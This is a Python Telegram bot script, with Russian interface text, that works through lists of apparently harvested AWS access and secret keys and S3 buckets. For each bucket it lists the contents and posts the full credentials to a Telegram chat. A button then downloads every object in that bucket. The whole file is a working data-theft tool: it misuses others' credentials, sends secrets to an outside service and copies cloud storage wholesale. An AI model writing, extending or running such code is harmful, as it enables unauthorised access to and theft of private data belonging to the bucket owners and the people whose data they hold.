#!/usr/bin/env python3
"""
S3 Bucket Review with Telegram Bot
Processes non-deleted S3 buckets and sends interactive Telegram messages for each bucket
"""

import boto3
import json
import csv
import os
import time
import logging
from datetime import datetime
from botocore.exceptions import ClientError, NoCredentialsError
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import asyncio
from pathlib import Path

# Configuration
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"

# Media file extensions
MEDIA_EXTENSIONS = {
    'jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'webp', 'tiff', 'ico',
    'mp4', 'mov', 'avi', 'mkv', 'flv', 'wmv', 'webm', 'm4v',
    'mp3', 'wav', 'flac', 'aac', 'ogg', 'm4a', 'wma',
    'pdf', 'doc', 'docx', 'ppt', 'pptx', 'xls', 'xlsx'
}

# Global variables
current_bucket_index = 0
buckets_to_process = []
current_bucket_data = None
download_directory = "/path/to/your/download/directory"
progress_file = "/path/to/your/progress/file.txt"

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def load_original_buckets():
    """Load original bucket list from found_buckets file"""
    buckets = []
    try:
        with open('/path/to/your/found_buckets_file.txt', 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f, delimiter='|')
            for row in reader:
                buckets.append({
                    'access_key': row['Access Key'],
                    'account_id': row['Account ID'],
                    'user_path': row['User Path'],
                    'bucket_name': row['Bucket Name'],
                    'access_level': row['Access Level']
                })
        logger.info(f"Loaded {len(buckets)} original buckets")
        return buckets
    except Exception as e:
        logger.error(f"Error loading original buckets: {e}")
        return []

def load_deleted_buckets():
    """Load deleted bucket list"""
    deleted_buckets = set()
    try:
        with open('/path/to/your/deleted_buckets_file.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip() and '|' in line:
                    parts = line.strip().split('|')
                    if len(parts) >= 4:
                        bucket_name = parts[3]
                        deleted_buckets.add(bucket_name)
        logger.info(f"Loaded {len(deleted_buckets)} deleted buckets")
        return deleted_buckets
    except Exception as e:
        logger.error(f"Error loading deleted buckets: {e}")
        return set()

def load_credentials():
    """Load full credentials from complete keys file"""
    credentials_map = {}
    try:
        with open('/path/to/your/credentials_file.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and '|' in line:
                    parts = line.split('|')
                    if len(parts) >= 4:
                        access_key = parts[0]
                        secret_key = parts[1]
                        account_id = parts[2]
                        user_path = parts[3]
                        
                        credentials_map[access_key] = {
                            'secret_key': secret_key,
                            'account_id': account_id,
                            'user_path': user_path,
                            'status': 'VALID'
                        }
        
        logger.info(f"Loaded FULL credentials for {len(credentials_map)} access keys")
        return credentials_map
    except Exception as e:
        logger.error(f"Error loading credentials: {e}")
        return {}

def create_non_deleted_buckets_list():
    """Create list of non-deleted buckets with full credentials"""
    original_buckets = load_original_buckets()
    deleted_buckets = load_deleted_buckets()
    credentials = load_credentials()
    
    non_deleted_buckets = []
    
    for bucket in original_buckets:
        bucket_name = bucket['bucket_name']
        if bucket_name not in deleted_buckets:
            access_key = bucket['access_key']
            if access_key in credentials:
                cred_info = credentials[access_key]
                non_deleted_buckets.append({
                    'bucket_name': bucket_name,
                    'access_key': access_key,
                    'secret_key': cred_info['secret_key'],
                    'account_id': bucket['account_id'],
                    'user_path': bucket['user_path'],
                    'access_level': bucket['access_level']
                })
    
    logger.info(f"Found {len(non_deleted_buckets)} non-deleted buckets to process")
    return non_deleted_buckets

def is_media_file(filename):
    """Check if file is a media file based on extension"""
    ext = filename.lower().split('.')[-1] if '.' in filename else ''
    return ext in MEDIA_EXTENSIONS

def analyze_bucket_contents(s3_client, bucket_name):
    """Analyze bucket contents and return file information"""
    try:
        logger.info(f"Analyzing bucket: {bucket_name}")
        
        paginator = s3_client.get_paginator('list_objects_v2')
        pages = paginator.paginate(Bucket=bucket_name)
        
        files = []
        media_count = 0
        total_size = 0
        
        for page in pages:
            if 'Contents' in page:
                for obj in page['Contents']:
                    key = obj['Key']
                    size = obj['Size']
                    total_size += size
                    
                    if is_media_file(key):
                        media_count += 1
                    else:
                        files.append(key)
        
        # Sort files and limit to 20
        files = sorted(files)[:20]
        
        logger.info(f"Bucket {bucket_name}: {len(files)} files, {media_count} media, {round(total_size / (1024**3), 2)} GB")
        
        return {
            'files': files,
            'media_count': media_count,
            'total_size_gb': round(total_size / (1024**3), 2)
        }
    except ClientError as e:
        error_code = e.response['Error']['Code']
        logger.error(f"ClientError analyzing bucket {bucket_name}: {error_code} - {e}")
        return {
            'files': [],
            'media_count': 0,
            'total_size_gb': 0,
            'error': error_code
        }
    except Exception as e:
        logger.error(f"Error analyzing bucket {bucket_name}: {e}")
        return {
            'files': [],
            'media_count': 0,
            'total_size_gb': 0,
            'error': str(e)
        }

def save_progress(bucket_index):
    """Save current progress to file"""
    try:
        with open(progress_file, 'w', encoding='utf-8') as f:
            f.write(f"{bucket_index}\n")
        logger.info(f"Progress saved: bucket {bucket_index}")
    except Exception as e:
        logger.error(f"Error saving progress: {e}")

def load_progress():
    """Load progress from file"""
    try:
        if os.path.exists(progress_file):
            with open(progress_file, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content.isdigit():
                    progress = int(content)
                    logger.info(f"Progress loaded: bucket {progress}")
                    return progress
    except Exception as e:
        logger.error(f"Error loading progress: {e}")
    return 0

def create_s3_client(access_key, secret_key):
    """Create S3 client with given credentials"""
    try:
        session = boto3.Session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key
        )
        return session.client('s3')
    except Exception as e:
        logger.error(f"Error creating S3 client: {e}")
        return None

async def send_bucket_info(context: ContextTypes.DEFAULT_TYPE, bucket_data, bucket_contents):
    """Send bucket information to Telegram"""
    global current_bucket_data
    current_bucket_data = bucket_data
    
    # Format message
    message = f"""🪣 Bucket: {bucket_data['bucket_name']}

🔑 Access Key: {bucket_data['access_key']}
🔐 Secret Key: {bucket_data['secret_key']}
👤 User: {bucket_data['user_path']}
🏢 Account ID: {bucket_data['account_id']}
📊 Access Level: {bucket_data['access_level']}

📁 Files ({len(bucket_contents['files'])}):
"""
    
    if bucket_contents['files']:
        for file in bucket_contents['files']:
            message += f"• {file}\n"
    else:
        message += "• No non-media files found\n"
    
    message += f"""
🎬 Media Files: {bucket_contents['media_count']}
💾 Total Size: {bucket_contents['total_size_gb']} GB

Выберите действие:"""
    
    # Create inline keyboard
    keyboard = [
        [
            InlineKeyboardButton("📥 Скачать", callback_data="download"),
            InlineKeyboardButton("⏭️ Пропустить", callback_data="skip")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=TELEGRAM_CHAT_ID,
        text=message,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def download_bucket_files(bucket_data):
    """Download all files from bucket"""
    try:
        s3_client = create_s3_client(bucket_data['access_key'], bucket_data['secret_key'])
        if not s3_client:
            return False
        
        bucket_name = bucket_data['bucket_name']
        bucket_dir = os.path.join(download_directory, bucket_name)
        os.makedirs(bucket_dir, exist_ok=True)
        
        # Get all objects
        paginator = s3_client.get_paginator('list_objects_v2')
        pages = paginator.paginate(Bucket=bucket_name)
        
        downloaded_count = 0
        for page in pages:
            if 'Contents' in page:
                for obj in page['Contents']:
                    key = obj['Key']
                    local_path = os.path.join(bucket_dir, key)
                    
                    # Create directory if needed
                    os.makedirs(os.path.dirname(local_path), exist_ok=True)
                    
                    try:
                        s3_client.download_file(bucket_name, key, local_path)
                        downloaded_count += 1
                    except Exception as e:
                        logger.error(f"Error downloading {key}: {e}")
        
        logger.info(f"Downloaded {downloaded_count} files from {bucket_name}")
        return True
        
    except Exception as e:
        logger.error(f"Error downloading bucket {bucket_data['bucket_name']}: {e}")
        return False

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button clicks"""
    query = update.callback_query
    await query.answer()
    
    global current_bucket_index, current_bucket_data
    
    if current_bucket_data is None:
        await query.edit_message_text("❌ Ошибка: данные бакета не найдены")
        current_bucket_index += 1
        save_progress(current_bucket_index)
        # Пауза перед следующим бакетом
        await asyncio.sleep(2)
        await process_next_bucket(context)
        return
    
    if query.data == "download":
        # Скачиваем файлы без промежуточных сообщений
        success = await download_bucket_files(current_bucket_data)
        
        # Показываем результат только после завершения
        if success:
            await query.edit_message_text(f"✅ Скачивание завершено!\nБакет: {current_bucket_data['bucket_name']}")
        else:
            await query.edit_message_text(f"❌ Ошибка при скачивании!\nБакет: {current_bucket_data['bucket_name']}")
    
    elif query.data == "skip":
        await query.edit_message_text(f"⏭️ Пропущен бакет: {current_bucket_data['bucket_name']}")
    
    # Move to next bucket and save progress
    current_bucket_index += 1
    save_progress(current_bucket_index)
    # Пауза перед следующим бакетом
    await asyncio.sleep(2)
    await process_next_bucket(context)

async def process_next_bucket(context: ContextTypes.DEFAULT_TYPE):
    """Process next bucket in the list"""
    global current_bucket_index, buckets_to_process
    
    if current_bucket_index >= len(buckets_to_process):
        await context.bot.send_message(
            chat_id=TELEGRAM_CHAT_ID,
            text="🎉 Все бакеты обработаны!"
        )
        return
    
    bucket_data = buckets_to_process[current_bucket_index]
    
    # Create S3 client and analyze bucket
    s3_client = create_s3_client(bucket_data['access_key'], bucket_data['secret_key'])
    if not s3_client:
        await context.bot.send_message(
            chat_id=TELEGRAM_CHAT_ID,
            text=f"❌ Ошибка подключения к бакету: {bucket_data['bucket_name']}"
        )
        current_bucket_index += 1
        save_progress(current_bucket_index)
        # Пауза перед следующим бакетом
        await asyncio.sleep(1)
        await process_next_bucket(context)
        return
    
    bucket_contents = analyze_bucket_contents(s3_client, bucket_data['bucket_name'])
    
    # Skip buckets with access errors
    if 'error' in bucket_contents:
        logger.info(f"Skipping bucket with error: {bucket_data['bucket_name']} - {bucket_contents['error']}")
        current_bucket_index += 1
        save_progress(current_bucket_index)
        # Пауза перед следующим бакетом
        await asyncio.sleep(1)
        await process_next_bucket(context)
        return
    
    # Skip empty buckets (0 files and 0 size) - don't show to user at all
    if bucket_contents['media_count'] == 0 and len(bucket_contents['files']) == 0 and bucket_contents['total_size_gb'] == 0:
        logger.info(f"Skipping empty bucket: {bucket_data['bucket_name']} - no files")
        current_bucket_index += 1
        save_progress(current_bucket_index)
        # Пауза перед следующим бакетом
        await asyncio.sleep(1)
        await process_next_bucket(context)
        return
    
    await send_bucket_info(context, bucket_data, bucket_contents)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    global buckets_to_process, current_bucket_index
    
    await update.message.reply_text("🚀 Начинаю обработку бакетов...")
    
    # Load buckets to process
    buckets_to_process = create_non_deleted_buckets_list()
    current_bucket_index = load_progress()
    
    if not buckets_to_process:
        await update.message.reply_text("❌ Нет бакетов для обработки!")
        return
    
    if current_bucket_index >= len(buckets_to_process):
        await update.message.reply_text("🎉 Все бакеты уже обработаны!")
        return
    
    await update.message.reply_text(f"📊 Найдено {len(buckets_to_process)} бакетов для обработки")
    await update.message.reply_text(f"📍 Продолжаем с бакета {current_bucket_index + 1}/{len(buckets_to_process)}")
    
    # Start processing
    await process_next_bucket(context)

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reset progress command handler"""
    global current_bucket_index
    
    current_bucket_index = 0
    save_progress(0)
    
    await update.message.reply_text("🔄 Прогресс сброшен! Начинаем с первого бакета.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Update {update} caused error {context.error}")

def main():
    """Main function"""
    # Create download directory
    os.makedirs(download_directory, exist_ok=True)
    
    # Create application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("reset", reset_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Start the bot
    logger.info("Starting Telegram bot...")
    application.run_polling()

if __name__ == "__main__":
    main()
